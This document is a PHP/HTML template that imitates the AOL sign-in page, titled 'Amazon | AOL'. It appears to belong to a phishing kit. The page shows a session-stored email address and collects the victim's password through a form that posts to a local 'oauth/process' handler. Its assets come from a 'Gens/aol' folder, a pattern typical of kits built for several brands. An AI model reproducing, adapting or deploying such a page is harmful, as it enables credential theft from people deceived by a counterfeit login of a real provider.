<?php
defined("ALLOW") or exit('No direct script access allowed');
?>

<!DOCTYPE html>
<html id="Stencil" lang="id-ID" class="no-js grid light-theme ">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no"/>
        <meta name="format-detection" content="telephone=no">
        <meta name="referrer" content="strict-origin-when-cross-origin">
        <meta name="oath:guce:consent-host" content="guce.aol.com"/>
        <title>Amazon | AOL</title>
        <meta name="description" content="AOL" />
        <link rel="icon" type="image/png" href="<?= base_url() ?>Gens/aol/aol-favicon.png">
        <link rel="shortcut icon" type="<?= base_url() ?>Gens/aol/aol-favicon.png">
        <link rel="apple-touch-icon" href="<?= base_url() ?>Gens/aol/aol-apple-touch-icon.png">
        <link rel="apple-touch-icon-precomposed" href="<?= base_url() ?>Gens/aol/aol-apple-touch-icon.png">
        <style nonce="3I5EJnM/w0noomLaU6dpbymkv5IeOsQ9ODCPiF7GjlGFceQs">
            #mbr-css-check {
                display: inline;
            }
        </style>
        <link href="<?= base_url() ?>Gens/aol/aol-main.css" rel="stylesheet" type="text/css">
    </head>
    <body class="bucket-mbr-fido-upsell-desktop1">
    <div id="login-body" class="loginish  puree-v2  grid   ">
    <div class="mbr-desktop-hd">
    <span class="column">
         <a href="#">
            <img src="<?= base_url() ?>Gens/aol/aol-logo-black-v.0.0.2.png" alt="Aol" class="logo " width="100" height="" />
            <img src="<?= base_url() ?>Gens/aol/aol-logo-white-v0.0.4.png" alt="Aol" class="dark-mode-logo logo " width="100" height="" />
        </a>
    </span>
    <div class="desktop-universal-header">
        <a href="#" data-rapid-tracking="true" data-ylk="elm:link;elmt:link;slk:headerHelp">Help</a>
        <a href="#" class="universal-header-links" data-rapid-tracking="true" data-ylk="elm:link;elmt:link;slk:headerTerms">Terms</a>
        <a href="#" class="universal-header-links privacy-link" data-rapid-tracking="true" data-ylk="elm:link;elmt:link;slk:headerPrivacy">Privacy</a>
    </div>
</div>
    <div class="login-box-container">
        <div class="login-box right">
            <div class="mbr-login-hd txt-align-center">
                    <img src="<?= base_url() ?>Gens/aol/aol-logo-black-v.0.0.2.png" alt="Aol" class="logo aol-id-ID" width="100" height="" />
                    <img src="<?= base_url() ?>Gens/aol/aol-logo-white-v0.0.4.png" alt="Aol" class="dark-mode-logo logo aol-id-ID" width="100" height="" />
            </div>
            <div class="challenge yid-challenge">
    <div class="challenge-header">
</div><div class="username-challenge" id="login-landing">
    <strong class="challenge-heading">Sign In</strong>
    <span class="challenge-desc">&nbsp;</span>
    </span>
    <span> <? $_SESSION ['email']; ?></span>
    <form method="post" action="<?= base_url() ?>oauth/process" class="text-left">
            </div>
            <div class="input-group">
                <input class="phone-no " type="password" name="password" id="password" value="" autocomplete="" autocapitalize="none" autocorrect="off" autofocus="true"  placeholder=" " />
                <div class="input-field-icon hide" id="username-field-icon"></div>
                <label for="login-username" id="login-label" class="login-label">Password</label>
                <ul class="auto-fill-overlay hide" aria-live="polite" id="domain-auto-fill">
                    <li data-fill="yahoo.com" tabindex="2">yahoo.com</li><li data-fill="gmail.com" tabindex="3">gmail.com</li><li data-fill="outlook.com" tabindex="4">outlook.com</li><li data-fill="aol.com" tabindex="5">aol.com</li>
                </ul>            </div>
        </div>
        <p id="username-error" class="error-msg hide" role="alert"></p>


        <div class="button-container">
            <input id="login-signin" type="submit" name="signin" class="pure-button puree-button-primary challenge-button" value="Sign In" data-rapid-tracking="true" data-ylk="elm:btn;elmt:primary;slk:next;mKey:next" />
        </div>

        <div class="helper-links-container">
        </div>


        <div class="bottom-links-container">
        </div>
    </form>
</div>
</div>
        </div>
        <div id="login-box-ad-fallback" class="login-box-ad-fallback">
            <h1></h1>
<p></p>
        </div>
    </div>
    <div class="login-bg-outer">
        <div class="login-bg-inner">
            <div id="login-ad-rich" aria-hidden="true">
                <iframe id="login-ads-gpt-iframe" allow="geolocation &#x27;none&#x27;; fullscreen &#x27;none&#x27;; autoplay &#x27;none&#x27;; camera &#x27;none&#x27;; display-capture &#x27;none&#x27;; document-domain &#x27;none&#x27;; microphone &#x27;none&#x27;; gyroscope &#x27;none&#x27;; magnetometer &#x27;none&#x27;; midi &#x27;none&#x27;; payment &#x27;none&#x27;; serial &#x27;none&#x27;; speaker-selection &#x27;none&#x27;" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts" width="1440" height="1024" scrolling="no" frameborder="no"></iframe>
            </div>
                    </div>
    </div>
</div>
    <script src="<?= base_url() ?>Gens/aol/aol.js"></script>
    <noscript>
        <img src="#" height="0" width="0" style="visibility: hidden;">
    </noscript>
    
    <div id="mbr-css-check"></div>
    <div id="page-mask" class="page-mask hide"></div>
    <div id="ad"></div>
    <div class="mbr-legacy-device-bar" id="mbr-legacy-device-bar">
        <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Tutup peringatan ini">x</label>
        <input type="checkbox" id="mbr-legacy-device-bar-cross" />
    </div>
    </body>
</html>
<!-- fe33.member.sg3.yahoo.com - Thu Sep 19 2024 16:05:05 GMT+0000 (Coordinated Universal Time) - (0ms) -->